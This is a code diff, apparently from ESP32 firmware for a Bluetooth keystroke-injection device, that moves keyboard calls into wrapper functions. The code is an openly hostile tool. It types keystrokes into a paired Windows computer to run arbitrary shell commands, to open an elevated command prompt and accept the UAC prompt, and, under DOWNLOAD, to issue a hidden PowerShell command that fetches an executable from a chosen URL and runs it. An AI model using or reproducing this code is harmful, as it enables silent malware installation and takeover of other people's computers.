@@ -179,7 +179,7 @@ String runCommand(String raw) {
     }
     if (subUp=="OFF") { stopBle(); result="BT OFF. Memory freed."; goto done; }
     if (subUp=="STATUS") {
-      bool paired = btActive && bleKbd && bleKbd->isConnected();
+      bool paired = btActive && bleIsConnected();
       result="BT: "+(btActive?String("ON"):String("OFF"))+"<br>";
       if (btActive) result+="NAME:   "+btName+"<br>PAIRED: "+(paired?"YES":"WAITING");
       result+="<br>HEAP:   "+String(ESP.getFreeHeap()/1024)+"KB";
@@ -203,7 +203,7 @@ String runCommand(String raw) {
       result="BT RENAMED: "+btName+(btActive?" (restarted)":""); goto done;
     }
 
-    if (!btActive || !bleKbd || !bleKbd->isConnected()) {
+    if (!btActive || !bleIsConnected()) {
       result="<span class='er'>NOT PAIRED. Run BT ON and pair device first.</span>"; goto done;
     }
 
@@ -219,8 +219,8 @@ String runCommand(String raw) {
       if (nUp.startsWith("SAVE ")) {
         String fname=parseQuotedArg(nArgs.substring(5),0);
         if (fname=="") { result="<span class='er'>FORMAT: BT NOTE SAVE \"filename\"</span>"; goto done; }
-        bleKbd->press(KEY_LEFT_CTRL); bleKbd->press('s'); delay(100); bleKbd->releaseAll();
-        safeDelay(900); bleKbd->print(fname); bleKbd->write(KEY_RETURN);
+        blePress(KEY_LEFT_CTRL); blePress('s'); delay(100); bleReleaseAll();
+        safeDelay(900); blePrint(fname); bleWrite(KEY_RETURN);
         result="SAVED: "+fname; goto done;
       }
       bool doMax=nUp.startsWith("FULL"), doClean=nUp.startsWith("CLEAN");
@@ -242,57 +242,57 @@ String runCommand(String raw) {
       btTypeText(t,btTypingDelay(spd),sty);
       result="SENT: "+String(t.length())+" chars ["+spd+"]["+sty+"]"; goto done;
     }
-    if (subUp=="LOCK")     { bleKbd->press(KEY_LEFT_GUI); bleKbd->press('l'); delay(100); bleKbd->releaseAll(); result="LOCKED."; goto done; }
-    if (subUp=="MUTE")     { bleKbd->write(KEY_MEDIA_MUTE);        result="MUTED.";  goto done; }
-    if (subUp=="VOL UP")   { bleKbd->write(KEY_MEDIA_VOLUME_UP);   result="VOL +.";  goto done; }
-    if (subUp=="VOL DOWN") { bleKbd->write(KEY_MEDIA_VOLUME_DOWN); result="VOL -.";  goto done; }
-    if (subUp=="SCREENSHOT") { bleKbd->press(KEY_LEFT_GUI); bleKbd->press(KEY_PRTSC); delay(100); bleKbd->releaseAll(); result="SCREENSHOT."; goto done; }
-    if (subUp=="MINALL")   { bleKbd->press(KEY_LEFT_GUI); bleKbd->press('d'); delay(100); bleKbd->releaseAll(); result="MINIMIZED ALL."; goto done; }
+    if (subUp=="LOCK")     { blePress(KEY_LEFT_GUI); blePress('l'); delay(100); bleReleaseAll(); result="LOCKED."; goto done; }
+    if (subUp=="MUTE")     { bleWrite(KEY_MEDIA_MUTE);        result="MUTED.";  goto done; }
+    if (subUp=="VOL UP")   { bleWrite(KEY_MEDIA_VOLUME_UP);   result="VOL +.";  goto done; }
+    if (subUp=="VOL DOWN") { bleWrite(KEY_MEDIA_VOLUME_DOWN); result="VOL -.";  goto done; }
+    if (subUp=="SCREENSHOT") { blePress(KEY_LEFT_GUI); blePress(KEY_PRTSC); delay(100); bleReleaseAll(); result="SCREENSHOT."; goto done; }
+    if (subUp=="MINALL")   { blePress(KEY_LEFT_GUI); blePress('d'); delay(100); bleReleaseAll(); result="MINIMIZED ALL."; goto done; }
     if (subUp.startsWith("SEARCH ")) {
       String q=parseQuotedArg(sub.substring(7),0);
-      bleKbd->press(KEY_LEFT_GUI); bleKbd->press('s'); delay(200); bleKbd->releaseAll();
-      safeDelay(600); bleKbd->print(q);
+      blePress(KEY_LEFT_GUI); blePress('s'); delay(200); bleReleaseAll();
+      safeDelay(600); blePrint(q);
       result="SEARCHED: "+q; goto done;
     }
     if (subUp.startsWith("URL ")) {
       String url=parseQuotedArg(sub.substring(4),0);
-      bleKbd->press(KEY_LEFT_GUI); bleKbd->press('r'); delay(200); bleKbd->releaseAll();
-      safeDelay(700); bleKbd->print(url); bleKbd->write(KEY_RETURN);
+      blePress(KEY_LEFT_GUI); blePress('r'); delay(200); bleReleaseAll();
+      safeDelay(700); blePrint(url); bleWrite(KEY_RETURN);
       result="URL OPENED: "+url; goto done;
     }
     if (subUp.startsWith("SHELL ")) {
       String cmd=parseQuotedArg(sub.substring(6),0);
-      bleKbd->press(KEY_LEFT_GUI); bleKbd->press('r'); delay(200); bleKbd->releaseAll();
-      safeDelay(700); bleKbd->print(cmd); bleKbd->write(KEY_RETURN);
+      blePress(KEY_LEFT_GUI); blePress('r'); delay(200); bleReleaseAll();
+      safeDelay(700); blePrint(cmd); bleWrite(KEY_RETURN);
       result="SHELL: "+cmd; goto done;
     }
     if (subUp=="ADMIN") {
-      bleKbd->press(KEY_LEFT_GUI); bleKbd->press('r'); delay(200); bleKbd->releaseAll();
+      blePress(KEY_LEFT_GUI); blePress('r'); delay(200); bleReleaseAll();
       safeDelay(700);
-      bleKbd->print("cmd"); bleKbd->press(KEY_LEFT_CTRL); bleKbd->press(KEY_LEFT_SHIFT);
-      bleKbd->write(KEY_RETURN); bleKbd->releaseAll();
+      blePrint("cmd"); blePress(KEY_LEFT_CTRL); blePress(KEY_LEFT_SHIFT);
+      bleWrite(KEY_RETURN); bleReleaseAll();
       safeDelay(800);
-      bleKbd->write(KEY_LEFT_ARROW); bleKbd->write(KEY_RETURN);
+      bleWrite(KEY_LEFT_ARROW); bleWrite(KEY_RETURN);
       result="ADMIN CMD OPENED."; goto done;
     }
     if (subUp=="RICKROLL") {
-      bleKbd->press(KEY_LEFT_GUI); bleKbd->press('r'); delay(200); bleKbd->releaseAll();
-      safeDelay(900); bleKbd->print("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
-      bleKbd->write(KEY_RETURN); result="NEVER GONNA GIVE YOU UP."; goto done;
+      blePress(KEY_LEFT_GUI); blePress('r'); delay(200); bleReleaseAll();
+      safeDelay(900); blePrint("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
+      bleWrite(KEY_RETURN); result="NEVER GONNA GIVE YOU UP."; goto done;
     }
     if (subUp.startsWith("MATRIX")) {
       int cnt=80; String cs=sub.length()>7?sub.substring(7):""; cs.trim();
       if (cs.length()>0) cnt=cs.toInt(); cnt=constrain(cnt,1,500);
-      for (int i=0;i<cnt;i++) { if(emergencyKill)break; bleKbd->write((char)('a'+random(26))); safeDelay(25); }
+      for (int i=0;i<cnt;i++) { if(emergencyKill)break; bleWrite((uint8_t)('a'+random(26))); safeDelay(25); }
       result="MATRIX: "+String(cnt)+" CHARS."; goto done;
     }
     if (subUp.startsWith("DOWNLOAD ")) {
       String url=parseQuotedArg(sub.substring(9),0);
       if (url=="") { result="<span class='er'>FORMAT: BT DOWNLOAD \"url\"</span>"; goto done; }
-      bleKbd->press(KEY_LEFT_GUI); bleKbd->press('r'); delay(200); bleKbd->releaseAll();
+      blePress(KEY_LEFT_GUI); blePress('r'); delay(200); bleReleaseAll();
       safeDelay(700);
-      bleKbd->print("powershell -w hidden -c \"iwr '" + url + "' -OutFile $env:TEMP\\run.exe; Start-Process $env:TEMP\\run.exe\"");
-      bleKbd->write(KEY_RETURN);
+      blePrint("powershell -w hidden -c \"iwr '" + url + "' -OutFile $env:TEMP\\run.exe; Start-Process $env:TEMP\\run.exe\"");
+      bleWrite(KEY_RETURN);
       result="DOWNLOAD PAYLOAD SENT."; goto done;
     }
     if (subUp.startsWith("PAYLOAD")) {
